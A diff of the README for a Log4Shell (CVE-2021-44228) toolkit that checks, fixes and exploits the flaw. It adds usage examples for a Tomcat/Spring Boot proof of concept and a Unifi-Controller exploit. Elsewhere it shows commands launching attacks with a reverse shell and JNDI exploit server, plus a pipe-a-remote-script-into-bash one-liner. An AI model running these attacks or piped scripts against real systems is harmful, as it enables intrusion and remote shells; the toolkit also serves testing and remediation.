@@ -13,7 +13,7 @@ Log4j - Multitool. Find &amp; fix possible CVE-2021-44228 vulneraries - provides
 
 # How to Run on Linux/Mac/BSD:
 
-### Requirements:
+## Requirements:
 
 - https://docs.docker.com/get-docker/
 - Debian / Ubuntu: ```apt update ; apt install default-jre screen python3-pip bash curl```
@@ -22,14 +22,14 @@ Log4j - Multitool. Find &amp; fix possible CVE-2021-44228 vulneraries - provides
 - BSD pkg: ```pkg install default-jre screen python3-pip curl```
 - Mac OS (Brew): ```/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" ; brew install default-jre screen python3 pip```
 
-### Quick check your system with this oneliner:
+## Quick check your system with this oneliner:
 
 ```bash
 wget https://raw.githubusercontent.com/suuhm/log4shell4shell/main/log4shell4shell.sh -qO- | bash -s -- --check-system
 ```
 
-### More Options
-#### Run a sample attack against IP: 10.4.4.20 Port 8080 loginpage and additionally a Reverse Proxy Shell :
+## More Options
+### Run a sample attack against IP: 10.4.4.20 Port 8080 loginpage and additionally a Reverse Proxy Shell:
 
 ```bash
 git clone https://github.com/suuhm/log4shell4shell ; cd log4shell4shell
@@ -39,14 +39,26 @@ mv log4shell4shell.sh l4s4s.sh && chmod +x l4s4s.sh
 Run ```screen -r l4s4s-ldap-srv``` and/or ```screen -r l4s4s-nc-rsh``` to view some attacking infos in Exploit-Server shell: 
 
 
-#### Run a full scan  IP: 10.4.4.20 Port 8080 and additionally a try all tests :
+### Run a full scan  IP: 10.4.4.20 Port 8080 and additionally a try all tests :
 
 ```bash
 ./l4s4s.sh --python-scan "-u 10.4.4.20:8080 --run-all-tests"
 ```
 
+### Run a Proof of Concept on a Tomcat Springboot Server:
 
-### All available Options
+```bash
+./l4s4s.sh --run-dummy-server && \
+./l4s4s.sh --run-attack http://127.0.0.1:4280 -e
+```
+
+### Run a Unifi-Controller Exploit Attack/Check (on 10.4.4.20:8443):
+
+```bash
+./l4s4s.sh --run-attack 10.4.4.20:8443 -e --unifi-post
+```
+
+## All available Options
 
 ```bash
 _|                            _|  _|              _|                  _|  _|  _|  _|              _|                  _|  _|
@@ -57,21 +69,27 @@ _|_|_|_|    _|_|      _|_|_|      _|    _|_|_|    _|    _|    _|_|_|  _|  _|    
                           _|
                       _|_|
 
+
  > Running Log4shell Framework & Check-Toolkit on shell v0.1a (C) 2021 suuhm
- 
+
+Wrong input! Please enter one of these options:
 
 Usage: ./l4s4s.sh [OPTIONS] <IP:PORT|COMMAND>
 
                         --get-powershell-finder
                         --check-system
                         --fix-log4j
-                        --run-dummy-server <LDAP-SERVER.zip>
-                        --run-attack <FORMAT: IP:PORT> <-e/-t>
+                        --run-dummy-server <JNDIExploit.*.zip>
+                        --run-attack <FORMAT: IP:PORT> <-e/-t/'cmd'> [--unifi-post]
                         --python-scan <command>
 
 ```
 
-# How to Run on Windows x86 / x64:
+# How to upgrade your linux and/or macos python version:
+
+Just run my helper-script (--list-versions): ``` ./python-upgrader.sh ```
+
+# How to run on Windows x86 / x64:
 
 Just run in Powershell (admin-mode): ``` .\set_windows_fix.ps1 ```
 
